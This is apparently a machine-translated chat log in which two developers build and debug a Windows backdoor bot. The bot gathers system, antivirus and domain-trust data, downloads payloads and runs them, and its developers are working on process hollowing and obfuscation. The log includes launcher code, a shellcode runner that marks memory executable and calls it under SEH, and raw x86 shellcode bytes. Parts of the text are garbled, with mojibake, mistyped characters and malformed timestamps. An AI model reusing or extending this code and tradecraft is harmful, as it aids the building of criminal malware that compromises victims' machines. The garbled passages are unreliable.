It was an epic, too, I had everything turned off, apparently such an advanced build

2020-08-12T14:32:14 price -> mushroom
and suddenly I don't interrogate somehow

2020-08-12T14:32:31 price -> mushroom
And here is a list of processes and installed programs there are a lot of synonyms

2020-08-12T14:33:01 price -> mushroom
At least they would have had PID processes, but they were like that

2020-08-12T14:33:10 price -> mushroom
I send them inexhaustibly

2020-08-12T14:33:32 price -> mushroom
And I take information from 3 sources

2020-08-12T14:33:50 price -> mushroom
From the registry and also from MSI

2020-08-12T14:34:16 mushroom -> price
And how is it not duplicated?

2020-08-12T14:34:37 price -> mushroom
Run through the list of found and do not include it if it is already included

2020-08-12T14:34:55 mushroom -> price
Oh, right.

2020-08-12T14:35:03 price -> mushroom
how else

2020-08-12T14:35:16 mushroom -> price
Suit yourself.

2020-08-12T14:35:18 price -> mushroom
and it's 468 programs and it's over 1000

2020-08-12T14:36:33 price -> mushroom
In short, I'm aiming for the finish line, diving back in, I'll write to the tracker today, by Monday I will come out with the last questions (holoving if any, obfuscation, etc.)

2020-08-12T14:36:53 mushroom -> price
Don't forget to upload to GitLab and write to Redmine. I'll take a look at it later.

2020-08-12T14:36:56 price -> mushroom
But the base is ready and will be finalized

2020-08-12T14:37:06 mushroom -> price
OK.

2020-08-12T14:37:06 price -> mushroom
That's what I'm talking about.

2020-08-12T14:37:36 price -> mushroom
I always remember this, but really either in a debugging state or fall asleep

2020-08-12T14:37:46 price -> mushroom
while

2020-08-12T14:37:56 mushroom -> price
Bye.

2020-08-12T14:38:10 price -> mushroom
thanks

2020-08-17T08:58:02 mushroom -> price
Hi. Let me know when you upload the bot update to GitLab and we can look at it.

2020-08-17T08:58:33 price -> mushroom
I'll upload it right now and look at it, I'm debugging.

2020-08-17T08:58:53 price -> mushroom
in about 10 minutes

2020-08-17T09:15:40 price -> mushroom
uploaded, check it out.

2020-08-17T09:16:26 price -> mushroom
nltest never worked

2020-08-17T09:16:51 price -> mushroom
All other network commands work, but this one won't find it

2020-08-17T09:20:39 mushroom -> price
Does it work on the command line?

2020-08-17T09:21:10 price -> mushroom
just inline and powershelle works

2020-08-17T09:21:38 price -> mushroom
When I run it under createprocess both there and there, it does not run, nor does it run as a separate executable

2020-08-17T09:22:02 price -> mushroom
I also ran it with the full path

2020-08-17T09:22:53 price -> mushroom
if the project is built, you can uncomment the launcher at the beginning and all settings are already preinstalled in it

2020-08-17T09:23:19 price -> mushroom
and you can run the longscore and see what stdout returns

2020-08-17T09:46:23 mushroom -> price
Falls all the time on command 1.

2020-08-17T09:47:20 mushroom -> price
Right here:
lstrcatA(SystemInfo, "&trust=");
//icommand = 10;cmdline = "c:\\\windows\\\\system32\\nltest.exe /DOMAIN_TRUSTS";
icommand = 10; cmdline = "c:\\windows\\\system32\\nltest.exe";
ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);

2020-08-17T09:47:25 price -> mushroom
a minute

2020-08-17T09:52:03 price -> mushroom
Launch last errorcode 2

2020-08-17T09:52:38 price -> mushroom
My CreateProcess crashes with code 2 - no file

2020-08-17T09:53:42 price -> mushroom
	DWORD icommand = 10, iruntype = 1, imaskprocess = 0, itimeout = 30;
	CHAR* resultarea=0,*URI="", *cmdline="c:\\windows\\system32\\nltest.exe /domain_trusts /all_trusts";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);

2020-08-17T09:53:51 mushroom -> price
And if cmdline = "nltest /domain_trusts /all_trusts"

2020-08-17T09:54:29 price -> mushroom
And also, type net /view in there as well.

2020-08-17T09:55:12 price -> mushroom
without full path-also code 2

2020-08-17T09:56:38 mushroom -> price
I have an exception either way. No matter how you spell it.

2020-08-17T09:57:20 mushroom -> price
Hollowing does not work.

2020-08-17T09:58:29 price -> mushroom
That's a no, I put in another all the time. Tried SEH.

2020-08-17T10:00:25 price -> mushroom
I also run a dll, but I don't get it from the server, I debugged it locally

2020-08-17T10:01:05 price -> mushroom
now connect the parcel to the path from the server, save with a random name and run

2020-08-17T10:01:31 price -> mushroom
System error 6118.
Server list for this workgroup is not available.

2020-08-17T10:01:46 price -> mushroom
* cmdline = "net view /all";
	launcher(&resultarea, icommand, URI, cmdline, iruntype, imaskprocess, itimeout);

2020-08-17T10:02:25 price -> mushroom
this works, but it is immediately swapped from CreateProcess to the output with the last code 2

2020-08-17T10:03:04 mushroom -> price
I have code 2 as well. Although in my bot works nltest.

2020-08-17T10:03:15 mushroom -> price
You have a mistake somewhere.

2020-08-17T10:03:22 price -> mushroom
That's exactly what I resent

2020-08-17T10:03:26 price -> mushroom
yes

2020-08-17T10:03:47 PM price -> mushroom
But in what way? - It's a bare api.

2020-08-17T10:04:24 price -> mushroom
That's right, now I will build the project from createprocess only

2020-08-17T10:04:56 price -> mushroom
f ns ujdjhbk? xnj dbcytn-'nj rfr& ghjljk;ftncz &

2020-08-17T10:05:13 price -> mushroom
and you said it's hanging - what does that mean - continuing?

2020-08-17T10:05:47 mushroom -> price
What's hanging?

2020-08-17T10:06:14 price -> mushroom
[12:46:22] <mushroom> Crashes constantly on command 1.

2020-08-17T10:07:03 price -> mushroom
I get it, it hangs, flies out, bad in general

2020-08-17T10:07:11 mushroom -> price
Doesn't hang, there's a NULL pointer somewhere and the program crashes.

2020-08-17T10:07:49 price -> mushroom
dit?

2020-08-17T10:08:20 price -> mushroom
Does it just start and crash or is there a command from the server?

2020-08-17T10:08:46 mushroom -> price
ipid = launcher(&netLists, icommand, URI, cmdline, iruntype, imaskprocess, itimeout); lstrcatA(SystemInfo, netLists); heapFree(netLists);

2020-08-17T10:08:52 mushroom -> price
On this line.

2020-08-17T10:09:58 price -> mushroom
in general it is just a line before DoInternet(), to illustrate nltest

2020-08-17T10:10:25 price -> mushroom
no, got it

2020-08-17T10:10:50 price -> mushroom
this is another place - it is a request for network commands in getsysteminfo

2020-08-17T10:15:29 price -> mushroom
here put - resultarea = GetSystemInfo();
	                    DoInternet(); it worked, but your case interrupts mine, I haven't accessed other machines yet

2020-08-17T10:17:16 mushroom -> price
Severity Code Description Project File String Suppression status
Error LNK2019 reference to unresolved external character _memset in function "int __cdecl launcher(char * *,unsigned long,char *,unsigned long,unsigned long,unsigned long)" (?launcher@@YAHPAPADKPAD1KKK@Z). bd6 C:\Users\ivana\Projects\others\bd6\backdoor\launcher.obj 1

2020-08-17T10:17:26 mushroom -> price
It's not going to.

2020-08-17T10:17:54 price -> mushroom
you ran it!

2020-08-17T10:18:06 price -> mushroom
added something?

2020-08-17T10:18:15 mushroom -> price
Yes. It's not going to now.

2020-08-17T10:18:27 price -> mushroom
there without CRT

2020-08-17T10:18:50 price -> mushroom
You should write lmemset instead of memset

2020-08-17T10:19:16 mushroom -> price
I didn't write memset anywhere.

2020-08-17T10:19:26 mushroom -> price
This is your _memset

2020-08-17T10:19:53 mushroom -> price
I can't find it in the project.

2020-08-17T10:20:19 price -> mushroom
there are none there, they don't find the linking

2020-08-17T10:20:47 price -> mushroom
it's just in the launcher

2020-08-17T10:20:52 price -> mushroom
says

2020-08-17T10:21:27 mushroom -> price
Have you tried running the x64 version.

2020-08-17T10:21:34 price -> mushroom
no

2020-08-17T10:21:50 price -> mushroom
x86 debug only

2020-08-17T10:21:54 mushroom -> price
I only see Win32 in the project settings.

2020-08-17T10:22:03 mushroom -> price
And I run x64 Debug

2020-08-17T10:22:07 price -> mushroom
That's all there is to it.

2020-08-17T10:22:25 price -> mushroom
Go to vin32, 64 will do

2020-08-17T10:23:01 mushroom -> price
Make it x64 too, 99 percent is x64 Win 10, we don't use x86 at all in our work now.

2020-08-17T10:23:19 price -> mushroom
Sure, I'll do it.

2020-08-17T10:23:48 mushroom -> price
That's what's crashing and _memset is not found.

2020-08-17T10:23:57 mushroom -> price
When you do it, you'll write it down then.

2020-08-17T10:24:02 price -> mushroom
ok

2020-08-17T10:24:16 price -> mushroom
I'm going to look it up.

2020-08-17T10:28:03 mushroom -> price
You have the /MTd flag in Release

2020-08-17T10:28:12 mushroom -> price
It should be /MT

2020-08-17T10:28:13 price -> mushroom
yes

2020-08-17T10:28:26 price -> mushroom
4 modules out

2020-08-17T10:28:35 price -> mushroom
with and without debug 64 and 86

2020-08-17T10:28:43 price -> mushroom
I understand the terms of reference

2020-08-17T10:29:01 mushroom -> price
Debug is Debug

2020-08-17T10:29:20 mushroom -> price
Everything else is Release with /MT

2020-08-17T10:29:52 mushroom -> price
There should be Debug, Release with logs, Release_nologs without logs.

2020-08-17T10:30:21 price -> mushroom
and the logs are what7

2020-08-17T10:30:47 mushroom -> price
What you write in the console for debugging.

2020-08-17T10:30:58 price -> mushroom
well

2020-08-17T10:31:14 mushroom -> price
You also need to write the same into the file.

2020-08-17T10:31:28 price -> mushroom
Multi-threaded Debug (/MTd)

2020-08-17T10:31:31 mushroom -> price
So that the tester will give you logs when it finds errors.

2020-08-17T10:32:08 price -> mushroom
Maybe it says something in the release, but I only debugged x86

2020-08-17T10:32:21 price -> mushroom
there can be any values

2020-08-17T10:32:30 price -> mushroom
I will make x64 now.

2020-08-17T10:32:52 price -> mushroom
Write to console and file at the same time?

2020-08-17T10:33:00 mushroom -> price
Yes.

2020-08-17T10:33:27 mushroom -> price
You can do that when you debug all the commands.

2020-08-17T10:33:54 mushroom -> price
The file for the tester is needed.

2020-08-17T10:34:10 price -> mushroom
got it

2020-08-17T10:34:25 mushroom -> price
Write the debug output for yourself however you want. It is desirable to write it in more detail.

2020-08-17T10:34:57 price -> mushroom
In the debugging issue, what should I mark?

2020-08-17T10:35:35 mushroom -> price
All you need to quickly figure out what and where the error is if anything.

2020-08-17T10:36:38 mushroom -> price
The progress of the program and from it you can immediately understand where the error occurred.

2020-08-17T10:40:30 mushroom -> price
About nltest:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
createProcess(NULL, tmpFilename, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, currDir, &startupInfo, &procInfo)

2020-08-17T10:40:50 mushroom -> price
So stupidly try running it.

2020-08-17T10:40:55 price -> mushroom
ok

2020-08-17T10:41:06 mushroom -> price
cmdline must not be const

2020-08-17T10:41:22 mushroom -> price
And you have a const of sorts.

2020-08-17T10:41:40 price -> mushroom
Why do the others start?

2020-08-17T10:41:48 mushroom -> price
No, you do strcopy first.

2020-08-17T10:41:56 price -> mushroom
I've seen it in the process of figuring out

2020-08-17T10:47:53 mushroom -> price
Like this:
STARTUPINFO startupInfo = { 0 };
startupInfo.cb = sizeof(STARTUPINFO);
PROCESS_INFORMATION procInfo = { 0 };
cmd[] = TEXT("nltest /domain_trusts /all_trusts");
createProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &procInfo);

2020-08-17T10:48:54 mushroom -> price
That should start it up. Then look for the difference in yourself as to why it doesn't start.

2020-08-17T10:49:16 price -> mushroom
thanks

2020-08-17T11:57:26 price -> mushroom
Now that I've seen it more closely, who came up with the idea of sending an entire megabyte of hex code through a space?

2020-08-17T11:57:57 price -> mushroom
is this correct or is it okay to not send spaces?

2020-08-17T11:59:04 mushroom -> price
You can do it without spaces. The main thing is that 2 characters was one byte.

2020-08-17T11:59:18 price -> mushroom
that's understandable

2020-08-17T11:59:47 price -> mushroom
just a space, it does not shrink and takes up space

2020-08-17T12:00:15 mushroom -> price
This is not critical.

2020-08-17T12:02:21 price -> mushroom
Also, when you repeat the run code command, the server fetches the command number before the script.

2020-08-17T12:03:10 price -> mushroom
that is, it does not just send a script, but the command number and the script in the script

2020-08-17T12:03:18 mushroom -> price
17 %hexcode%

2020-08-17T12:03:29 mushroom -> price
That's the way to do it.

2020-08-17T12:03:36 price -> mushroom
No, not there

2020-08-17T12:03:43 price -> mushroom
and in the window

2020-08-17T12:03:47 price -> mushroom
on the server

2020-08-17T12:04:05 PM price -> mushroom
It shouldn't be like this, you have to erase it all the time.

2020-08-17T12:04:26 mushroom -> price
That's not our problem.

2020-08-17T13:35:06 price -> mushroom
Failed to enumerate domain trust: Status = 1722 0x6ba RPC_SERVER_UNAVAILABLE

2020-08-17T13:35:19 price -> mushroom
Here's what I got out of it

2020-08-17T13:35:42 mushroom -> price
That's right.

2020-08-17T13:36:04 price -> mushroom
and all received on x64 debug

2020-08-17T13:37:29 mushroom -> price
Okay.

2020-08-17T13:38:07 price -> mushroom
I'll figure out why it wasn't embedded, embed it, and post it

2020-08-17T13:38:52 price -> mushroom
While I was working, I started launching shells, simple ones like 9090c3

2020-08-17T13:41:26 mushroom -> price
SEH to back it up there.

2020-08-17T13:41:35 mushroom -> price
Main thing.

2020-08-17T13:41:50 price -> mushroom
that's a ***pa

2020-08-17T13:42:20 price -> mushroom
I've been trying to embed all night, I know all these stack registrations by heart.

2020-08-17T13:43:11 price -> mushroom
without a CRT is practically impossible, in theory people write that it is easy

2020-08-17T13:44:38 price -> mushroom
I'll keep trying

2020-08-17T13:45:29 mushroom -> price
What is not possible without a CRT?

2020-08-17T13:45:36 price -> mushroom
I ran the entire NtosKrnl.lib on the debugger

2020-08-17T13:45:52 price -> mushroom
SEH exceptions try-except and try-finally without CRT
- you could use them if you implement _C_specific_handler (for 64-bit code) and _except_handler3 (for 32-bit code) functions.
See simple expample how to do that by calling original C runtime functions in win32_crt_seh.cpp file.
To use exception blocks and finalization constructions you should have a procedure which is substituted by the compiler for the real handler: for x86-projects it is __except_handler3, for x64 - __C_specific_handler.
These procedures perform their own dispatch: searching for and calling the necessary handlers and unwinding the stack.
For x86-project you can just connect NtosKrnl.lib from the directory C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x86,
for x64 -NtosKrnl.lib from directory C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64.

2020-08-17T13:46:09 mushroom -> price
Don't sweat it.

2020-08-17T13:46:27 price -> mushroom
To be seh would have to

2020-08-17T13:46:33 mushroom -> price
I have it like this:
_Success_(return != 0)
BOOL Commander::runBinaryCode(_In_reads_bytes_(codeSize) LPCBYTE code, _In_ SIZE_T codeSize)
{
    PVOID codeAddr = kernel32.virtualAlloc(NULL, codeSize, MEM_COMMIT, PAGE_READWRITE);
    if (!codeAddr)
        return FALSE;

    DWORD err = ERROR_SUCCESS;
    CopyMemory(codeAddr, code, codeSize);
    DWORD old = 0;
    if (!kernel32.virtualProtect(codeAddr, codeSize, PAGE_EXECUTE, &old))
    {
        err = kernel32.getLastError();
        kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
        kernel32.setLastError(err);
        return FALSE;
    }

#ifdef _MSC_VER
    BOOL success = TRUE;
    __try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }
#endif // _MSC_VER

    kernel32.virtualFree(codeAddr, codeSize, MEM_DECOMMIT);
    kernel32.setLastError(err);
#ifdef _MSC_VER
    return success;
#else
    return TRUE;
#endif // _MSC_VER
}

2020-08-17T13:46:52 mushroom -> price
That's the whole SEH:
__try
   {
       (*(VOID(*)())codeAddr)();
   }
   __except (EXCEPTION_EXECUTE_HANDLER)
   {
       success = FALSE;
   }

2020-08-17T13:47:22 price -> mushroom
I'll try, but there are some wild problems there

2020-08-17T13:47:32 price -> mushroom
Either you know or you haven't tried

2020-08-17T13:47:48 mushroom -> price
I've tried.

2020-08-17T13:48:15 price -> mushroom
Good for you, then I'm going to install nltest and screw in your SEX

2020-08-17T13:48:23 PM mushroom -> price
33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 8B CC 57 57 51 57 FF D0

2020-08-17T13:49:06 mushroom -> price
Hello World window for x86, then guaranteed error as stack is not restored there.

2020-08-17T13:49:08 price -> mushroom
Thanks, I don't have a calculator on my machine, and my laptop is x64

2020-08-17T13:49:18 mushroom -> price
That's what SEH is for.

2020-08-17T13:49:24 price -> mushroom
I got it

2020-08-17T13:49:29 mushroom -> price
On x64 there is an error.

2020-08-17T13:53:17 price -> mushroom
I got the message &trust=Failed to get encryption service provider (error=2148073501)

2020-08-17T13:53:28 price -> mushroom
cool?

2020-08-17T13:54:15 mushroom -> price
Is this for the nltest command?

2020-08-17T13:54:19 price -> mushroom
yes

2020-08-17T13:54:26 price -> mushroom
just popped up

2020-08-17T13:54:55 mushroom -> price
What it outputs is what you send. That's what it outputs for you. It's different for me, it's different for someone else.

2020-08-17T13:55:11 price -> mushroom
I used to have a captcha team typed in, maybe because of this?

2020-08-17T13:55:37 price -> mushroom
like this

2020-08-17T13:55:38 price -> mushroom
nltest.exe /DOMAIN_TRUSTS

2020-08-17T13:55:49 price -> mushroom
nltest.exe /domain_trusts

2020-08-17T13:56:15 mushroom -> price
And you need nltest /domain_trusts /all_trusts

2020-08-17T13:56:25 price -> mushroom
I'm just giving you an example.

2020-08-17T13:56:30 price -> mushroom
I've got it all.

2020-08-17T13:56:37 mushroom -> price
And write it without the exe.

2020-08-17T13:57:58 price -> mushroom
And with try exception I have big doubts. I did it that way. I even removed all the unresolved.

2020-08-17T13:58:18 price -> mushroom
but it gives me an unhandled exception c00005

2020-08-17T13:58:37 mushroom -> price
Need __try __except

2020-08-17T13:58:52 mushroom -> price
These are native Windows exceptions.

2020-08-17T13:59:09 price -> mushroom
That's what I'm doing from memory, I don't remember the exact syntax.

2020-08-17T13:59:26 mushroom -> price
I wrote an example above.

2020-08-17T13:59:27 price -> mushroom
But strongly tied to mvscrt

2020-08-17T13:59:45 price -> mushroom
I wrote the same, when there is a crt it is not a problem

2020-08-17T14:00:03 mushroom -> price
Can't help it, that's why the /MT flag for static linking.

2020-08-17T14:04:54:54 price -> mushroom
Isn't it possible to run some kind of thread, and let him do the task there himself and survive as he wants?

2020-08-17T14:05:54 mushroom -> price
This is if the timeout is 0.

2020-08-17T14:06:18 mushroom -> price
I'm not interested in the fate of the process.

2020-08-17T14:06:33 price -> mushroom
I mean without SEH.

2020-08-17T14:07:00 mushroom -> price
You can't shell code the whole program.

2020-08-17T14:07:13 PM mushroom -> price
Need SEH.

2020-08-17T14:07:41 PM price -> mushroom
I'll be digging, I know half the library already, the other half is left

2020-08-17T14:08:26 mushroom -> price
Finish it, it's mostly used for work.

2020-08-17T14:08:41 price -> mushroom
ok

2020-08-17T14:08:54 mushroom -> price
Hollowing in priority and scenarios.

2020-08-17T14:08:58 price -> mushroom
I'm putting x64 into gitlab right now

2020-08-17T15:33:48 price -> mushroom
And how to highlight the plus between UTC and 3, someone eats it. I've already put three of each and in quotes, doesn't help!

2020-08-17T15:43:00 mushroom -> price
Write something else instead of plus. Space, minus.

2020-08-17T15:43:39 price -> mushroom
The space itself turns out instead of a plus, the minus is fine.

2020-08-17T15:43:39 mushroom -> price
+ probably not allowed in the url.

2020-08-17T15:43:55 mushroom -> price
Leave it like that.

2020-08-17T15:43:58 price -> mushroom
maybe in words?

2020-08-17T15:44:05 mushroom -> price
Let the space itself get it.

2020-08-17T15:44:10 price -> mushroom
ok

2020-08-19T09:17:59 mushroom -> price
Hi. Team 1 antivirus РђРЅРС'РёРlРёСЂѓСЃРСЅР°СЏ РССїЂÐѕРіСЂР°РјРј

2020-08-19T09:18:17 price -> mushroom
Hi

2020-08-19T09:18:40 mushroom -> price
It should be Windows Defender.

2020-08-19T09:18:50 mushroom -> price
The rest of the command 1 is fine.

2020-08-19T09:19:00 price -> mushroom
I don't have a defender.

2020-08-19T09:19:05 price -> mushroom
I have avast

2020-08-19T09:19:16 mushroom -> price
Still.

2020-08-19T09:19:21 price -> mushroom
I mean, I don't know if it works or not.

2020-08-19T09:19:32 mushroom -> price
I have a Defender, but it shows PђРС'Ð¸ÐÐ²ÐÐ'ÑœЂѓСЃÐЅÐ°ÑЏ РССЕРСРіСЂÐ°Ð¼Ð¼

2020-08-19T09:19:43 price -> mushroom
What do you mean your encoding isn't correct?

2020-08-19T09:19:49 mushroom -> price
The coding must be.

2020-08-19T09:19:57 price -> mushroom
I'll take a look

2020-08-19T09:20:03 price -> mushroom
It was fine for me

2020-08-19T09:20:16 price -> mushroom
and it shows, it's out now, I'm looking at

2020-08-19T09:20:23 mushroom -> price
Maybe you only have Latin characters there.

2020-08-19T09:20:31 price -> mushroom
But most importantly, I SEH did!

2020-08-19T09:20:51 price -> mushroom
latin letters in utf8 as is

2020-08-19T09:21:14 price -> mushroom
And the question arose about working off the silk code

2020-08-19T09:21:18 mushroom -> price
And the non-Latin ones don't go.

2020-08-19T09:21:40 price -> mushroom
Is your defender written in russian?

2020-08-19T09:21:54 price -> mushroom
you have

2020-08-19T09:22:03 mushroom -> price
I don't. That's how you get it in the program.

2020-08-19T09:22:15 PM mushroom -> price


2020-08-19T09:22:21 mushroom -> price
It's in the log.

2020-08-19T09:22:35 price -> mushroom
I'll take a look thank you, I have everything translated normally and russian is in the data output

2020-08-19T09:22:50 price -> mushroom
I must have set something up for my configuration

2020-08-19T09:22:54 mushroom -> price
Hollowing not working yet?

2020-08-19T09:22:58 price -> mushroom
not yet

2020-08-19T09:23:03 price -> mushroom
just exe

2020-08-19T09:23:17 mushroom -> price
Does running with a save to disk file work?

2020-08-19T09:23:26 price -> mushroom
yes

2020-08-19T09:23:38 mushroom -> price
Does running scripts work?

2020-08-19T09:23:42 price -> mushroom
and starts and saves and deletes

2020-08-19T09:24:00 price -> mushroom
works

2020-08-19T09:24:19 mushroom -> price
What else can you check?

2020-08-19T09:24:26 price -> mushroom
not posted only, I made a long time ago and then commented, now catching up again

2020-08-19T09:24:40 price -> mushroom
wait an hour

2020-08-19T09:24:46 price -> mushroom
I will write what to test

2020-08-19T09:24:53 price -> mushroom
maybe 2

2020-08-19T09:29:10 mushroom -> price
Something cd c:\\r\ndir\r\n bat script without saving to disk did not work (no response to the command).

2020-08-19T09:29:47 price -> mushroom
It's uncommented, but it's all written, I'll post it in a couple of hours

2020-08-19T09:30:09 PM mushroom -> price
So I'm not looking at the scripts yet.

2020-08-19T09:30:41 PM price -> mushroom
don't watch anything yet to see it right away

2020-08-19T09:30:46 mushroom -> price
Do the scripts work with saving?

2020-08-19T09:31:03 price -> mushroom
everything works through the file and through the pips

2020-08-19T09:31:32 price -> mushroom
this is one branch of generating a filename and saving bytes by this filename and then deleting

2020-08-19T09:31:42 mushroom -> price
Okay. Let's get it up and running and I'll take a look then.

2020-08-19T09:31:49 price -> mushroom
works for bat,ps,exe,dll

2020-08-19T09:31:57 price -> mushroom
yes, I do

2020-08-19T09:32:08 price -> mushroom
Here's the silk code you posted, does it work?

2020-08-19T09:33:24 mushroom -> price
Only for 32 bit program, shows window.

2020-08-19T09:33:45 price -> mushroom
and you have to click and it doesn't end on its own?

2020-08-19T09:34:13 price -> mushroom
How does our software apparatus behave then?

2020-08-19T09:34:14 mushroom -> price
After completing it error, for x64 immediately error, just you can check the exception catching with SEH.

2020-08-19T09:34:19 price -> mushroom
goes away right away

2020-08-19T09:34:40 mushroom -> price
In the window click OK.

2020-08-19T09:34:41 price -> mushroom
if you click - then the exception turns out?

2020-08-19T09:34:53 mushroom -> price
In x64 there will be an error right away.

2020-08-19T09:35:22 mushroom -> price
The exception will be there anyway. You can close as soon as the window closes.

2020-08-19T09:35:30 price -> mushroom
I silkod run a track to SEX work, I have to wait until you click?

2020-08-19T09:35:48 mushroom -> price
The stack is not restored after shell code execution.

2020-08-19T09:35:55 price -> mushroom
and don't care

2020-08-19T09:36:07 price -> mushroom
I'm trashing the whole thread.

2020-08-19T09:36:15 price -> mushroom
in the seh.

2020-08-19T09:36:35 price -> mushroom
See if you like it.

2020-08-19T09:38:07 price -> mushroom
it started to collapse, unnoticeably switched to rileys and there the stack is small, causes an exception

2020-08-19T09:38:11 price -> mushroom
I'll fix it now.

2020-08-19T09:38:17 price -> mushroom
that's what we need time for.

2020-08-19T09:39:06 mushroom -> price
OK.

2020-08-19T09:56:27 price -> mushroom
You have the next thing about the network in Russian!

2020-08-19T09:56:30 price -> mushroom
System error 6118.

2020-08-19T09:56:56 price -> mushroom
and it's all one line encoded decoded

2020-08-19T09:57:10 price -> mushroom
Ok, I'll take a closer look.

2020-08-19T09:57:28 price -> mushroom
Maybe there is a separate processing for ativiri

2020-08-19T10:03:48 price -> mushroom
go to the bot 57396fd3c3f052de4c8d0ceb1dfa32db, there I put the Russian letters and they are fine, advise where to look

2020-08-19T10:05:14 price -> mushroom
I'll leave the Russian debugging insert for you to run in your own place afterwards

2020-08-19T10:27:02 mushroom -> price
This is where the anti-virus probably messes up the encoding:
hr = PtrProduct->get_ProductName(&PtrVal);
        if (FAILED(hr)) {debug_printf(L "get_ProductName failed with error: 0x%d\n", hr);
            goto exit;
        }
        debug_printf(L"\nProduct name: %s\n", PtrVal;)
        int ilen = lstrlenW(PtrVal);
        UNICODE2char(PtrVal, productName, ilen);
        productName[ilen] = 0;

2020-08-19T10:28:00 price -> mushroom
Yes, I get it in Unicode and translate it to multibyte

2020-08-19T10:28:23 price -> mushroom
	 WideCharToMultiByte(CP_UTF8, WC_DEFAULTCHAR, unicode, ilen, (LPSTR)onebyte, ilen, NULL, NULL);

2020-08-19T10:29:15 price -> mushroom
onebyte is it

2020-08-19T10:29:22 price -> mushroom
what's wrong?

2020-08-19T10:29:36 price -> mushroom
and most importantly I use it everywhere

2020-08-19T10:30:05 PM -> price


2020-08-19T10:30:30 price -> mushroom
it's a fact

2020-08-19T10:30:38 mushroom -> price
Look for where you output this line.

2020-08-19T10:30:49 price -> mushroom
debug_printf(L"\nProduct name: %s\n", PtrVal);

2020-08-19T10:31:15 price -> mushroom
How about %ls?

2020-08-19T10:31:21 mushroom -> price
Maybe it's 866 there.

2020-08-19T10:31:27 mushroom -> price
Or 1251

2020-08-19T10:31:42 price -> mushroom
%ls?

2020-08-19T10:32:32 mushroom -> price
No.

2020-08-19T10:32:37 price -> mushroom
Is that why she keeps on churning it out like that?

2020-08-19T10:32:46 price -> mushroom
got it - no

2020-08-19T10:33:26 price -> mushroom
How do you know what kind of form it's in?

2020-08-19T10:33:26 mushroom -> price
PtrVal encoding is not correct.

2020-08-19T10:33:51 mushroom -> price
Ifm Latin is ok, but the Russian is not.

2020-08-19T10:33:57 price -> mushroom
this is generally from the system gives PtrProduct->get_ProductName(&PtrVal);

2020-08-19T10:34:20 price -> mushroom
I don't touch it.

2020-08-19T10:34:35 price -> mushroom
can force a 1251 encoding

2020-08-19T10:34:39 price -> mushroom
?

2020-08-19T10:34:45 price -> mushroom
I can

2020-08-19T10:36:12 PM price -> mushroom
Ok, I'll send you a look, I think the Russian will come

2020-08-19T10:36:14 price -> mushroom
letters

2020-08-19T10:38:17 mushroom -> price
This is what it looks like in Unicode:
L "Microsoft Defender Antivirus Program".

2020-08-19T10:38:23 mushroom -> price
This is PtrVal

2020-08-19T10:38:36 mushroom -> price
Then it spoils, look for where.

2020-08-19T10:39:09 price -> mushroom
right in my code like this?

2020-08-19T10:39:14 mushroom -> price
This is spoiled here: UNICODE2char(PtrVal, productName, ilen);

2020-08-19T10:39:26 mushroom -> price
I ran it in the debugger now.

2020-08-19T10:39:47 mushroom -> price
productName is quacky.

2020-08-19T10:39:47 price -> mushroom
WideCharToMultiByte(CP_UTF8, WC_DEFAULTCHAR, unicode, ilen, (LPSTR)onebyte, ilen, NULL, NULL); , this CP_UTF8 screws up

2020-08-19T10:41:21 mushroom -> price
Example:
_Success_(return != 0)
BOOL wideCharToUtf8(_In_reads_(wcsSize) PCWSTR wcs, _In_ int wcsSize, _Outptr_ PSTR* utf8Str,
    _Out_ int* utf8StrSize)
{
    int cb = WideCharToMultiByte(CP_UTF8, 0, wcs, wcsSize, NULL, 0, NULL, NULL);
    PSTR result = (PSTR)HeapAlloc(GetProcessHeap(), 0, cb);
    if (!result)
        return FALSE;

    cb = WideCharToMultiByte(CP_UTF8, 0, wcs, wcsSize, result, cb, NULL, NULL);

    *utf8Str = result;
    *utf8StrSize = cb;
    return TRUE;
}

2020-08-20T09:03:46 mushroom -> price
Well. Can I watch?

2020-08-20T11:32:45 price -> mushroom
see

2020-08-20T11:33:07 price -> mushroom
exe and dll work

2020-08-20T11:36:46 price -> mushroom
nltest found that x64 works, but x86 for some reason does not find the file, and debugger olly or PE explorer, if you call the file do not take it.

2020-08-20T11:37:30 price -> mushroom
It's also strange that the .bat dir gives out, but whoami writes that there is no such command

2020-08-20T11:38:27 price -> mushroom
also strange, that .ps1 gives out some strange text back, although the same processing of .bat - everything is fine with the encoding

2020-08-20T11:39:41 price -> mushroom
I've been circling these errors for 5 hours this morning, to no avail.

2020-08-20T11:42:53 price -> mushroom
also tested that if I build x64 release, for some reason it generates x86 release, just look at the easiest way how you generate. I have the suffixes in the name for each build - r/d 86/64

2020-08-20T11:48:57 mushroom -> price
I'll check it out later.

2020-08-20T11:49:25 price -> mushroom
Come on, I was just waking up.

2020-08-20T12:36:49 mushroom -> price
also tested that if I build x64 release, for some reason it generates x86 release, here's the easiest way to see how it's generated. I have the suffixes in the name for each build - r/d 86/64

2020-08-20T12:37:06 mushroom -> price
Re-create the project just from scratch.

2020-08-20T12:37:20 mushroom -> price
Or rather, the solution.

